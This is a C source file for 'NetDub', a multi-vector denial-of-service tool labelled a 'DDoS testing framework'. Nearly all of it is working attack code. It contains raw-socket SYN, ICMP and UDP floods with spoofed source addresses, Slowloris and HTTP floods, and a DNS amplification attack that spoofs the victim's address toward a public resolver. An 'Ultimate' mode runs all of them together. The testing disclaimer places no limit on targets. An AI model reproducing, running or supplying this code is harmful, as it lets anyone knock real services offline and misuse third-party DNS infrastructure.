/*
 * NetDub - Multi-Layer DDoS Testing Framework
 * Root privileges required for raw socket operations
 * For security testing and vulnerability assessment only
 * 
 * Compile: gcc -o netdub netdub.c -lpthread -lpcap
 * Usage: sudo ./netdub <target_ip> <target_port>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/resource.h>
#include <pcap.h>

// ============== CONFIGURATION ==============
#define MAX_THREADS 1000
#define MAX_SOCKETS 65535
#define BUFFER_SIZE 65536
#define PACKET_SIZE 1500
#define MAX_EVENTS 10000

// Attack modes
typedef enum {
    ATTACK_SYN_FLOOD = 1,
    ATTACK_UDP_FLOOD,
    ATTACK_ICMP_FLOOD,
    ATTACK_SLOWLORIS,
    ATTACK_HTTP_FLOOD,
    ATTACK_AMPLIFICATION,
    ATTACK_MIXED_LAYER,
    ATTACK_ULTIMATE
} attack_mode_t;

// Global variables
char target_ip[16];
int target_port;
int attack_mode;
int thread_count = 100;
int packet_rate = 1000000; // 1M pps
volatile int running = 1;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;

// ============== UTILITY FUNCTIONS ==============
void print_banner() {
    printf("\033[1;31m");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                         NetDub v2.0                         ║\n");
    printf("║                Multi-Layer DDoS Testing Framework           ║\n");
    printf("║                    Root Privileges Required                 ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\033[0m");
    printf("\033[1;33m⚠️  FOR SECURITY TESTING AND VULNERABILITY ASSESSMENT ONLY ⚠️\033[0m\n\n");
}

void print_menu() {
    printf("\033[1;36m");
    printf("┌─────────────────────────────────────────────────────────────┐\n");
    printf("│                       Attack Modes                         │\n");
    printf("├─────────────────────────────────────────────────────────────┤\n");
    printf("│  1. SYN Flood        (Layer 4 - TCP SYN Amplification)     │\n");
    printf("│  2. UDP Flood        (Layer 4 - UDP Amplification)         │\n");
    printf("│  3. ICMP Flood       (Layer 3 - ICMP Ping of Death)        │\n");
    printf("│  4. Slowloris        (Layer 7 - Slow HTTP Headers)         │\n");
    printf("│  5. HTTP Flood       (Layer 7 - HTTP GET/POST Flood)       │\n");
    printf("│  6. Amplification    (Layer 3-4 - DNS/NTP Amplification)   │\n");
    printf("│  7. Mixed Layer      (Layer 3-7 - Combined Attack)         │\n");
    printf("│  8. Ultimate Test    (All Layers - Maximum Destruction)    │\n");
    printf("└─────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    result = ~sum;
    return result;
}

void update_stats(unsigned long long packets, unsigned long long bytes) {
    pthread_mutex_lock(&stats_mutex);
    total_packets += packets;
    total_bytes += bytes;
    pthread_mutex_unlock(&stats_mutex);
}

// ============== LAYER 3 ATTACKS ==============
void* icmp_flood(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    char packet[PACKET_SIZE];
    int one = 1;
    unsigned long long local_packets = 0;
    
    // Create raw socket (requires root)
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("ICMP socket creation failed");
        return NULL;
    }
    
    // Set socket options
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    // Setup target
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    
    // Craft ICMP packet
    memset(packet, 0, PACKET_SIZE);
    ip_header = (struct iphdr*)packet;
    icmp_header = (struct icmphdr*)(packet + sizeof(struct iphdr));
    
    // IP header
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
    ip_header->id = htons(12345);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_ICMP;
    ip_header->saddr = inet_addr("127.0.0.1");
    ip_header->daddr = target.sin_addr.s_addr;
    ip_header->check = 0;
    ip_header->check = checksum((unsigned short*)packet, ip_header->tot_len);
    
    // ICMP header
    icmp_header->type = ICMP_ECHO;
    icmp_header->code = 0;
    icmp_header->checksum = 0;
    icmp_header->un.echo.id = getpid();
    icmp_header->un.echo.sequence = 1;
    icmp_header->checksum = checksum((unsigned short*)icmp_header, sizeof(struct icmphdr));
    
    printf("\033[1;32m[ICMP] Thread started - Flood mode activated\033[0m\n");
    
    while (running) {
        // Random source IP
        ip_header->saddr = rand();
        ip_header->check = 0;
        ip_header->check = checksum((unsigned short*)packet, ip_header->tot_len);
        
        if (sendto(sockfd, packet, ip_header->tot_len, 0, (struct sockaddr*)&target, sizeof(target)) > 0) {
            local_packets++;
        }
        
        if (local_packets % 10000 == 0) {
            update_stats(10000, 10000 * sizeof(packet));
        }
    }
    
    close(sockfd);
    printf("\033[1;31m[ICMP] Thread terminated\033[0m\n");
    return NULL;
}

// ============== LAYER 4 ATTACKS ==============
void* syn_flood(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char packet[PACKET_SIZE];
    int one = 1;
    unsigned long long local_packets = 0;
    
    // Create raw socket (requires root)
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("TCP socket creation failed");
        return NULL;
    }
    
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    // Setup target
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    
    printf("\033[1;32m[SYN] Thread started - Flooding with SYN packets\033[0m\n");
    
    while (running) {
        memset(packet, 0, PACKET_SIZE);
        ip_header = (struct iphdr*)packet;
        tcp_header = (struct tcphdr*)(packet + sizeof(struct iphdr));
        
        // IP header
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->saddr = rand(); // Random source IP
        ip_header->daddr = target.sin_addr.s_addr;
        ip_header->check = 0;
        
        // TCP header
        tcp_header->source = htons(rand() % 65535);
        tcp_header->dest = htons(target_port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(5840);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;
        
        // Calculate checksums
        ip_header->check = checksum((unsigned short*)packet, ip_header->tot_len);
        
        if (sendto(sockfd, packet, ip_header->tot_len, 0, (struct sockaddr*)&target, sizeof(target)) > 0) {
            local_packets++;
        }
        
        if (local_packets % 10000 == 0) {
            update_stats(10000, 10000 * sizeof(packet));
        }
    }
    
    close(sockfd);
    printf("\033[1;31m[SYN] Thread terminated\033[0m\n");
    return NULL;
}

void* udp_flood(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    char buffer[BUFFER_SIZE];
    unsigned long long local_packets = 0;
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("UDP socket creation failed");
        return NULL;
    }
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    target.sin_port = htons(target_port);
    
    // Fill buffer with random data
    for (int i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = rand() % 256;
    }
    
    printf("\033[1;32m[UDP] Thread started - Flooding with UDP packets\033[0m\n");
    
    while (running) {
        if (sendto(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&target, sizeof(target)) > 0) {
            local_packets++;
        }
        
        if (local_packets % 10000 == 0) {
            update_stats(10000, 10000 * BUFFER_SIZE);
        }
    }
    
    close(sockfd);
    printf("\033[1;31m[UDP] Thread terminated\033[0m\n");
    return NULL;
}

// ============== LAYER 7 ATTACKS ==============
void* slowloris_attack(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    char request[1024];
    int sockets[1000];
    int socket_count = 0;
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    target.sin_port = htons(target_port);
    
    printf("\033[1;32m[SLOWLORIS] Thread started - Slow HTTP attack\033[0m\n");
    
    // Create initial connections
    for (int i = 0; i < 1000; i++) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) == 0) {
            snprintf(request, sizeof(request), 
                "GET /?%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (compatible; NetDub/2.0)\r\n"
                "Accept-language: en-US,en,q=0.5\r\n"
                "Connection: keep-alive\r\n",
                rand(), target_ip);
            
            send(sockfd, request, strlen(request), 0);
            sockets[socket_count++] = sockfd;
        } else {
            close(sockfd);
        }
    }
    
    // Keep connections alive
    while (running && socket_count > 0) {
        for (int i = 0; i < socket_count; i++) {
            snprintf(request, sizeof(request), "X-a: %d\r\n", rand());
            if (send(sockets[i], request, strlen(request), 0) < 0) {
                close(sockets[i]);
                sockets[i] = sockets[--socket_count];
                i--;
            }
        }
        
        update_stats(socket_count, socket_count * strlen(request));
        sleep(10);
    }
    
    // Cleanup
    for (int i = 0; i < socket_count; i++) {
        close(sockets[i]);
    }
    
    printf("\033[1;31m[SLOWLORIS] Thread terminated\033[0m\n");
    return NULL;
}

void* http_flood(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    char request[2048];
    char response[4096];
    unsigned long long local_packets = 0;
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    target.sin_port = htons(target_port);
    
    printf("\033[1;32m[HTTP] Thread started - HTTP flood attack\033[0m\n");
    
    while (running) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) == 0) {
            snprintf(request, sizeof(request),
                "GET /?cache_buster=%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (compatible; NetDub/2.0)\r\n"
                "Accept: */*\r\n"
                "Connection: close\r\n\r\n",
                rand(), target_ip);
            
            send(sockfd, request, strlen(request), 0);
            recv(sockfd, response, sizeof(response), 0);
            local_packets++;
        }
        
        close(sockfd);
        
        if (local_packets % 1000 == 0) {
            update_stats(1000, 1000 * strlen(request));
        }
    }
    
    printf("\033[1;31m[HTTP] Thread terminated\033[0m\n");
    return NULL;
}

// ============== AMPLIFICATION ATTACKS ==============
void* dns_amplification(void* arg) {
    int sockfd;
    struct sockaddr_in dns_server, target;
    char dns_query[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01";
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    char packet[PACKET_SIZE];
    int one = 1;
    unsigned long long local_packets = 0;
    
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("DNS amplification socket failed");
        return NULL;
    }
    
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    // Public DNS servers for amplification
    memset(&dns_server, 0, sizeof(dns_server));
    dns_server.sin_family = AF_INET;
    dns_server.sin_addr.s_addr = inet_addr("8.8.8.8");
    dns_server.sin_port = htons(53);
    
    printf("\033[1;32m[DNS-AMP] Thread started - DNS amplification attack\033[0m\n");
    
    while (running) {
        memset(packet, 0, PACKET_SIZE);
        ip_header = (struct iphdr*)packet;
        udp_header = (struct udphdr*)(packet + sizeof(struct iphdr));
        
        // IP header with spoofed source (target IP)
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_query);
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->saddr = inet_addr(target_ip); // Spoofed source
        ip_header->daddr = dns_server.sin_addr.s_addr;
        ip_header->check = 0;
        
        // UDP header
        udp_header->source = htons(rand() % 65535);
        udp_header->dest = htons(53);
        udp_header->len = htons(sizeof(struct udphdr) + sizeof(dns_query));
        udp_header->check = 0;
        
        // Copy DNS query
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), dns_query, sizeof(dns_query));
        
        ip_header->check = checksum((unsigned short*)packet, ip_header->tot_len);
        
        if (sendto(sockfd, packet, ip_header->tot_len, 0, (struct sockaddr*)&dns_server, sizeof(dns_server)) > 0) {
            local_packets++;
        }
        
        if (local_packets % 10000 == 0) {
            update_stats(10000, 10000 * sizeof(packet));
        }
    }
    
    close(sockfd);
    printf("\033[1;31m[DNS-AMP] Thread terminated\033[0m\n");
    return NULL;
}

// ============== ULTIMATE ATTACK ==============
void* ultimate_attack(void* arg) {
    printf("\033[1;32m[ULTIMATE] Launching multi-vector attack...\033[0m\n");
    
    pthread_t threads[8];
    
    // Launch all attack vectors simultaneously
    pthread_create(&threads[0], NULL, syn_flood, NULL);
    pthread_create(&threads[1], NULL, udp_flood, NULL);
    pthread_create(&threads[2], NULL, icmp_flood, NULL);
    pthread_create(&threads[3], NULL, slowloris_attack, NULL);
    pthread_create(&threads[4], NULL, http_flood, NULL);
    pthread_create(&threads[5], NULL, dns_amplification, NULL);
    pthread_create(&threads[6], NULL, syn_flood, NULL);
    pthread_create(&threads[7], NULL, udp_flood, NULL);
    
    // Wait for all threads
    for (int i = 0; i < 8; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\033[1;31m[ULTIMATE] Multi-vector attack completed\033[0m\n");
    return NULL;
}

// ============== STATISTICS ==============
void* stats_monitor(void* arg) {
    unsigned long long prev_packets = 0;
    unsigned long long prev_bytes = 0;
    time_t start_time = time(NULL);
    
    while (running) {
        sleep(1);
        
        pthread_mutex_lock(&stats_mutex);
        unsigned long long curr_packets = total_packets;
        unsigned long long curr_bytes = total_bytes;
        pthread_mutex_unlock(&stats_mutex);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bps = curr_bytes - prev_bytes;
        double mbps = (bps * 8.0) / (1024.0 * 1024.0);
        double gbps = mbps / 1024.0;
        
        printf("\033[2J\033[H"); // Clear screen
        printf("\033[1;35m");
        printf("╔══════════════════════════════════════════════════════════════╗\n");
        printf("║                      NetDub Statistics                      ║\n");
        printf("╠══════════════════════════════════════════════════════════════╣\n");
        printf("║ Target: %-15s Port: %-6d Mode: %d            ║\n", target_ip, target_port, attack_mode);
        printf("║ Runtime: %-10ld seconds                                ║\n", time(NULL) - start_time);
        printf("║                                                              ║\n");
        printf("║ Packets/sec: %-15llu (%.2f M pps)                    ║\n", pps, pps / 1000000.0);
        printf("║ Total Packets: %-15llu                                ║\n", curr_packets);
        printf("║                                                              ║\n");
        printf("║ Bandwidth: %-10.2f Mbps (%.4f Gbps)                    ║\n", mbps, gbps);
        printf("║ Total Bytes: %-15llu                                  ║\n", curr_bytes);
        printf("║                                                              ║\n");
        printf("║ Status: \033[1;32mATTACK IN PROGRESS\033[1;35m                               ║\n");
        printf("║ Press Ctrl+C to stop                                        ║\n");
        printf("╚══════════════════════════════════════════════════════════════╝\n");
        printf("\033[0m");
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
    }
    
    return NULL;
}

// ============== SIGNAL HANDLER ==============
void signal_handler(int sig) {
    printf("\n\033[1;31m[!] Signal received. Stopping attack...\033[0m\n");
    running = 0;
}

// ============== MAIN FUNCTION ==============
int main(int argc, char *argv[]) {
    if (geteuid() != 0) {
        printf("\033[1;31m[!] This program requires root privileges\033[0m\n");
        printf("Usage: sudo %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }
    
    if (argc != 3) {
        print_banner();
        printf("Usage: sudo %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }
    
    strcpy(target_ip, argv[1]);
    target_port = atoi(argv[2]);
    
    print_banner();
    print_menu();
    
    printf("Select attack mode (1-8): ");
    scanf("%d", &attack_mode);
    
    printf("Number of threads (1-%d): ", MAX_THREADS);
    scanf("%d", &thread_count);
    
    if (thread_count > MAX_THREADS) {
        thread_count = MAX_THREADS;
    }
    
    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Increase resource limits
    struct rlimit rlim;
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_NOFILE, &rlim);
    
    printf("\n\033[1;32m[*] Starting NetDub attack on %s:%d\033[0m\n", target_ip, target_port);
    printf("\033[1;32m[*] Threads: %d | Mode: %d\033[0m\n", thread_count, attack_mode);
    printf("\033[1;33m[*] Press Ctrl+C to stop\033[0m\n\n");
    
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thread;
    
    // Start statistics monitor
    pthread_create(&stats_thread, NULL, stats_monitor, NULL);
    
    // Launch attack threads
    for (int i = 0; i < thread_count; i++) {
        switch (attack_mode) {
            case ATTACK_SYN_FLOOD:
                pthread_create(&threads[i], NULL, syn_flood, NULL);
                break;
            case ATTACK_UDP_FLOOD:
                pthread_create(&threads[i], NULL, udp_flood, NULL);
                break;
            case ATTACK_ICMP_FLOOD:
                pthread_create(&threads[i], NULL, icmp_flood, NULL);
                break;
            case ATTACK_SLOWLORIS:
                pthread_create(&threads[i], NULL, slowloris_attack, NULL);
                break;
            case ATTACK_HTTP_FLOOD:
                pthread_create(&threads[i], NULL, http_flood, NULL);
                break;
            case ATTACK_AMPLIFICATION:
                pthread_create(&threads[i], NULL, dns_amplification, NULL);
                break;
            case ATTACK_ULTIMATE:
                pthread_create(&threads[i], NULL, ultimate_attack, NULL);
                break;
            default:
                // Mixed layer attack
                switch (i % 6) {
                    case 0: pthread_create(&threads[i], NULL, syn_flood, NULL); break;
                    case 1: pthread_create(&threads[i], NULL, udp_flood, NULL); break;
                    case 2: pthread_create(&threads[i], NULL, icmp_flood, NULL); break;
                    case 3: pthread_create(&threads[i], NULL, slowloris_attack, NULL); break;
                    case 4: pthread_create(&threads[i], NULL, http_flood, NULL); break;
                    case 5: pthread_create(&threads[i], NULL, dns_amplification, NULL); break;
                }
        }
        
        usleep(1000); // Small delay between thread creation
    }
    
    // Wait for all threads to complete
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(stats_thread, NULL);
    
    printf("\n\033[1;31m[!] NetDub attack completed\033[0m\n");
    printf("\033[1;36m[*] Final statistics:\033[0m\n");
    printf("  - Total packets sent: %llu\n", total_packets);
    printf("  - Total bytes sent: %llu\n", total_bytes);
    printf("  - Average bandwidth: %.2f Mbps\n", (total_bytes * 8.0) / (1024.0 * 1024.0));
    
    return 0;
}
